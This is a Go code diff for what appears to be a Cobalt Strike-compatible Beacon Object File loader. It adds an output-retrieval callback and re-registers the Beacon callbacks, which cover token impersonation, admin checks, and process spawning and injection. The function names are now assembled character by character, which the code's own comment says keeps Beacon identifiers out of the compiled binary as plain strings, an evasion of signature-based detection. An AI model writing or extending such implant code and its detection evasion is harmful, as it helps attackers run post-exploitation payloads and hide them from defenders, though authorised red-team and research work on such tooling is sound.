@@ -117,6 +117,30 @@ func toWideCharImpl(srcPtr, dstPtr, maxUnits uintptr) uintptr {
 	return uintptr(len(utf16) - 1)
 }
 
+// beaconGetOutputDataImpl mirrors char *BeaconGetOutputData(int *size).
+// Returns a pointer to a stable snapshot of the BOF's accumulated
+// output, writes the length to *size when supplied. Used by host
+// wrappers such as Fortra's No-Consolation BOF that re-read their own
+// output within the same Beacon API call. The snapshot is pinned on
+// the BOF for the rest of Execute so the address handed back stays
+// valid across subsequent callbacks; resets between Execute runs.
+func beaconGetOutputDataImpl(sizePtr uintptr) uintptr {
+	if currentBOF == nil || currentBOF.output == nil {
+		if sizePtr != 0 {
+			*(*int32)(unsafe.Pointer(sizePtr)) = 0
+		}
+		return 0
+	}
+	currentBOF.outputSnapshot = currentBOF.output.Bytes()
+	if sizePtr != 0 {
+		*(*int32)(unsafe.Pointer(sizePtr)) = int32(len(currentBOF.outputSnapshot))
+	}
+	if len(currentBOF.outputSnapshot) == 0 {
+		return 0
+	}
+	return uintptr(unsafe.Pointer(&currentBOF.outputSnapshot[0]))
+}
+
 // beaconAddValueImpl maps key (C string) → ptr in the per-BOF KV store.
 // Existing values are overwritten silently; CS contract is best-effort.
 func beaconAddValueImpl(keyPtr, valPtr uintptr) uintptr {
@@ -302,19 +326,22 @@ func beaconInjectTemporaryProcessImpl(
 	return 1
 }
 
-// registerExtraBeaconCallbacks adds the 12 new stubs to the resolver map.
+// registerExtraBeaconCallbacks adds the slice-1 + slice-1.c stubs to
+// the resolver map. Map keys built via impName so no Beacon identifier
+// appears as a contiguous ASCII string in the binary (1.c.1).
 // Called once from initBeaconCallbacks.
 func registerExtraBeaconCallbacks(m map[string]uintptr) {
-	m["__imp_BeaconUseToken"] = syscall.NewCallback(beaconUseTokenImpl)
-	m["__imp_BeaconRevertToken"] = syscall.NewCallback(beaconRevertTokenImpl)
-	m["__imp_BeaconIsAdmin"] = syscall.NewCallback(beaconIsAdminImpl)
-	m["__imp_BeaconGetCustomUserData"] = syscall.NewCallback(beaconGetCustomUserDataImpl)
-	m["__imp_toWideChar"] = syscall.NewCallback(toWideCharImpl)
-	m["__imp_BeaconAddValue"] = syscall.NewCallback(beaconAddValueImpl)
-	m["__imp_BeaconGetValue"] = syscall.NewCallback(beaconGetValueImpl)
-	m["__imp_BeaconRemoveValue"] = syscall.NewCallback(beaconRemoveValueImpl)
-	m["__imp_BeaconSpawnTemporaryProcess"] = syscall.NewCallback(beaconSpawnTemporaryProcessImpl)
-	m["__imp_BeaconCleanupProcess"] = syscall.NewCallback(beaconCleanupProcessImpl)
-	m["__imp_BeaconInjectProcess"] = syscall.NewCallback(beaconInjectProcessImpl)
-	m["__imp_BeaconInjectTemporaryProcess"] = syscall.NewCallback(beaconInjectTemporaryProcessImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'U', 's', 'e', 'T', 'o', 'k', 'e', 'n')] = syscall.NewCallback(beaconUseTokenImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'R', 'e', 'v', 'e', 'r', 't', 'T', 'o', 'k', 'e', 'n')] = syscall.NewCallback(beaconRevertTokenImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'I', 's', 'A', 'd', 'm', 'i', 'n')] = syscall.NewCallback(beaconIsAdminImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'C', 'u', 's', 't', 'o', 'm', 'U', 's', 'e', 'r', 'D', 'a', 't', 'a')] = syscall.NewCallback(beaconGetCustomUserDataImpl)
+	m[impName('t', 'o', 'W', 'i', 'd', 'e', 'C', 'h', 'a', 'r')] = syscall.NewCallback(toWideCharImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'A', 'd', 'd', 'V', 'a', 'l', 'u', 'e')] = syscall.NewCallback(beaconAddValueImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'V', 'a', 'l', 'u', 'e')] = syscall.NewCallback(beaconGetValueImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'a', 'l', 'u', 'e')] = syscall.NewCallback(beaconRemoveValueImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'S', 'p', 'a', 'w', 'n', 'T', 'e', 'm', 'p', 'o', 'r', 'a', 'r', 'y', 'P', 'r', 'o', 'c', 'e', 's', 's')] = syscall.NewCallback(beaconSpawnTemporaryProcessImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'C', 'l', 'e', 'a', 'n', 'u', 'p', 'P', 'r', 'o', 'c', 'e', 's', 's')] = syscall.NewCallback(beaconCleanupProcessImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'I', 'n', 'j', 'e', 'c', 't', 'P', 'r', 'o', 'c', 'e', 's', 's')] = syscall.NewCallback(beaconInjectProcessImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'I', 'n', 'j', 'e', 'c', 't', 'T', 'e', 'm', 'p', 'o', 'r', 'a', 'r', 'y', 'P', 'r', 'o', 'c', 'e', 's', 's')] = syscall.NewCallback(beaconInjectTemporaryProcessImpl)
+	m[impName('B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'O', 'u', 't', 'p', 'u', 't', 'D', 'a', 't', 'a')] = syscall.NewCallback(beaconGetOutputDataImpl)
 }
